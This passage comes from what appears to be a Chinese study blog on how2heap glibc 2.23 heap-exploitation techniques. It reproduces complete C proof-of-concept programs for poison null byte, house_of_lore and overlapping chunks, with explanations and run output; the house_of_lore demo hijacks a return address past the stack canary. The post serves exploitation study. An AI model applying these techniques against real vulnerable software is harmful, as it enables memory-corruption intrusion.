chunk.\n"</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b2: %p\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">'B'</span>,<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Current b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Finally, we allocate 'd', overlapping 'b2'.\n"</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"d: %p\n"</span>,d);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now 'd' and 'b2' overlap.\n"</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">'D'</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"New b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"</span></span><br><span class="line">		<span class="string">"for the clear explanation of this technique.\n"</span>);</span><br><span class="line"></span><br><span class="line">	assert(<span class="built_in">strstr</span>(b2, <span class="string">"DDDDDDDDDDDD"</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>当程序存在off-by-null漏洞的时候就可以使用这个攻击。</p>
<p>首先申请了四个chunk，分别是0x100， 0x200， 0x100， 0x100。最后一个barrier是为了防止与top chunk合并。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/7.png"></p>
<p>接下来是要用off-by-null将b这里的size变成0x200，然后对其进行释放，2.23下肯定要过检测：会检查 chunk size 与 next chunk 的 prev_size 是否相等，所以第58行将伪造了一个next chunk的prev_size为0x200。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/8.png"></p>
<p>释放，并改b的size为0x200</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/9.png"></p>
<p>申请0x100大小的chunk，这个时候会将unsortedbin进行分割，b1就会落在原来的b的起始位置。</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/10.png"></p>
<p>申请0x80大小的chunk作为b2并对b2进行填充</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/11.png"></p>
<p>现在释放b1和c，这两个中间包含着b2。可以看到这三个chunk已经合并起来了，假如直接申请0x300大小的chunk是不是就可以随心所卻的控制b2了（XD</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/12.png"></p>
<p>申请一个chunk d并填充数据，b2的的content就会被覆盖。这就是利用off-by-null漏洞实现over lapping</p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Welcome to poison null byte 2.0!</span><br><span class="line">Tested in Ubuntu 16.04 64bit.</span><br><span class="line">This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.</span><br><span class="line">This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.</span><br><span class="line">We allocate 0x100 bytes for 'a'.</span><br><span class="line">a: 0x55555555b010</span><br><span class="line">Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): 0x108</span><br><span class="line">b: 0x55555555b120</span><br><span class="line">c: 0x55555555b330</span><br><span class="line">We allocate a barrier at 0x55555555b440, so that c is not consolidated with the top-chunk when freed.</span><br><span class="line">The barrier is not strictly necessary, but makes things less confusing</span><br><span class="line">In newer versions of glibc we will need to have our updated size inside b itself to pass the check 'chunksize(P) != prev_size (next_chunk(P))'</span><br><span class="line">b.size: 0x211</span><br><span class="line">b.size is: (0x200 + 0x10) | prev_in_use</span><br><span class="line">We overflow 'a' with a single null byte into the metadata of 'b'</span><br><span class="line">b.size: 0x200</span><br><span class="line">c.prev_size is 0x210</span><br><span class="line">We will pass the check since chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))</span><br><span class="line">b1: 0x55555555b120</span><br><span class="line">Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: 0x210</span><br><span class="line">Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0</span><br><span class="line">We malloc 'b2', our 'victim' chunk.</span><br><span class="line">b2: 0x55555555b230</span><br><span class="line">Current b2 content:</span><br><span class="line">BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><br><span class="line">Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').</span><br><span class="line">Finally, we allocate 'd', overlapping 'b2'.</span><br><span class="line">d: 0x55555555b120</span><br><span class="line">Now 'd' and 'b2' overlap.</span><br><span class="line">New b2 content:</span><br><span class="line">DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD</span><br><span class="line">Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique.</span><br></pre></td></tr></tbody></table></figure>

<h3 id="house-of-lore-small-bin"><a href="#house-of-lore-small-bin" class="headerlink" title="house_of_lore(small bin)"></a>house_of_lore(small bin)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    {</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim)){</span></span><br><span class="line"><span class="comment">                  errstr = "malloc(): smallbin double linked list corrupted";</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                }</span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>{ <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Nice jump d00d\n"</span>); <span class="built_in">exit</span>(<span class="number">0</span>); }</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>{</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = {<span class="number">0</span>};</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = {<span class="number">0</span>};</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nWelcome to the House of Lore\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating the victim chunk\n"</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the first small chunk on the heap at %p\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_1 at %p\n"</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_2 at %p\n"</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Create a fake chunk on the stack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"</span></span><br><span class="line">         <span class="string">"in second to the last malloc, which putting stack address on smallbin list\n"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "</span></span><br><span class="line">         <span class="string">"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "</span></span><br><span class="line">         <span class="string">"chunk on stack"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating another large chunk in order to avoid consolidating the top chunk with"</span></span><br><span class="line">         <span class="string">"the small one during the free()\n"</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the large chunk on the heap at %p\n"</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIn the unsorted bin the victim's fwd and bk pointers are nil\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This means that the chunk %p will be inserted in front of the SmallBin\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n"</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk has been sorted and its fwd and bk pointers updated\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now allocating a chunk with size equal to the first one freed\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n"</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = malloc(0x100)\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n"</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 is %p and should be on the stack!\n"</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>将victim chunk和两个fake chunk构造成双向链表,然后再smallbin分配时候，便申请了到了fake chunk。技术实现效果与<code>fastbin_dup_into_stack</code>类似。</p>
<p>这里需要绕过两次检查，一次是fd指向small bin中的chunk，还有一次是fake chunk不能是small bin的最后一个chunk，这个利用手法笔者这里就不详细讲解了。</p>
<h3 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span>{</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis is a simple chunks overlapping problem\n\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's start to allocate 3 chunks on the heap\n"</span>);</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n"</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="string">'1'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p2, <span class="string">'2'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's free the chunk p2\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"For a toy program, the value of the last 3 bits is unimportant;"</span></span><br><span class="line">		<span class="string">" however, it is best to maintain the stability of the heap.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"</span></span><br><span class="line">		<span class="string">" to assure that p1 is not mistaken for a free chunk.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line">	<span class="type">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n"</span>,</span><br><span class="line">		 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the "size" field of chunk p2</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's allocate another chunk with a size equal to the data\n"</span></span><br><span class="line">	       <span class="string">"size of the chunk p2 injected size\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This malloc will be served from the previously freed chunk that\n"</span></span><br><span class="line">	       <span class="string">"is parked in the unsorted bin which size has been modified by us\n"</span>);</span><br><span class="line">	p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 has been allocated at %p and ends at %p\n"</span>, (<span class="type">char</span> *)p4, (<span class="type">char</span> *)p4+evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 starts at %p and ends at %p\n"</span>, (<span class="type">char</span> *)p3, (<span class="type">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 should overlap with p3, in this case p4 includes all p3.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"</span></span><br><span class="line">		<span class="string">" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's run through an example. Right now, we have:\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIf we memset(p4, '4', %d), we have:\n"</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">memset</span>(p4, <span class="string">'4'</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="type">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="type">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nAnd if we then memset(p3, '3', 80), we have:\n"</span>);</span><br><span class="line">	